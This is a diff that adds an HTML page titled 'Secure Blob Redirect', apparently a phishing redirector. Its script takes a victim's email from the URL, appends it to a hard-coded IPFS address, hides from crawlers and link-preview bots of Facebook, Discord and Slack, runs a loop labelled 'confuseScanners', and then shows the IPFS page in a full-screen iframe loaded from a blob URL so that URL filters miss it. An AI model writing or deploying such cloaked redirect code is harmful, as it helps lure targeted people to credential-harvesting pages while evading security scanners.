@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Secure Blob Redirect</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <style>
+        html, body { margin:0; padding:0; width:100%; height:100%; font-family:sans-serif; text-align:center; }
+        #message { margin-top:40px; }
+    </style>
+</head>
+<body>
+
+<div id="message">Loading...</div>
+
+<script>
+// -------------------------------
+// CONFIG: Your fixed safe IPFS URL
+// -------------------------------
+const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
+
+// -------------------------------
+// Step 1 — Get optional email parameter
+// -------------------------------
+function getEmail() {
+    const params = new URLSearchParams(window.location.search);
+    return params.get("email") || "";
+}
+
+// -------------------------------
+// Step 2 — Build final IPFS URL
+// -------------------------------
+function buildFinalURL() {
+    const email = getEmail();
+    return email ? BASE_IPFS + "#" + encodeURIComponent(email) : BASE_IPFS;
+}
+
+// -------------------------------
+// Step 3 — Anti-bot helpers
+// -------------------------------
+function randomDelay(min=150, max=600) {
+    return new Promise(res => setTimeout(res, Math.random() * (max - min) + min));
+}
+
+function isBot() {
+    const ua = navigator.userAgent.toLowerCase();
+    const bots = ["bot","crawl","spider","fetch","preview","facebook","discord","slack"];
+    return bots.some(x => ua.includes(x));
+}
+
+function confuseScanners() {
+    for (let i=0;i<50;i++) { (function(){return Math.random()*i;})(); }
+}
+
+// -------------------------------
+// Step 4 — Create blob HTML for redirect
+// -------------------------------
+function buildBlobHTML(url) {
+    const noise = Math.random().toString(36).slice(2);
+    return `
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <style>html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;}iframe{width:100%;height:100%;border:none;}</style>
+        </head>
+        <body data-noise="${noise}">
+            <iframe src="${url}"></iframe>
+        </body>
+        </html>
+    `;
+}
+
+// -------------------------------
+// Step 5 — Main redirect logic
+// -------------------------------
+document.addEventListener("DOMContentLoaded", async () => {
+
+    confuseScanners();
+
+    if (isBot()) {
+        document.getElementById("message").innerText = "Loading...";
+        return;
+    }
+
+    await randomDelay();
+
+    const proceed = confirm("Tap OK to continue");
+    if (!proceed) {
+        document.getElementById("message").innerText = "Redirect cancelled.";
+        return;
+    }
+
+    const finalURL = buildFinalURL();
+    const blobHTML = buildBlobHTML(finalURL);
+    const blob = new Blob([blobHTML], { type: "text/html" });
+    const blobURL = URL.createObjectURL(blob);
+
+    window.location.href = blobURL;
+});
+</script>
+
+</body>
+</html>
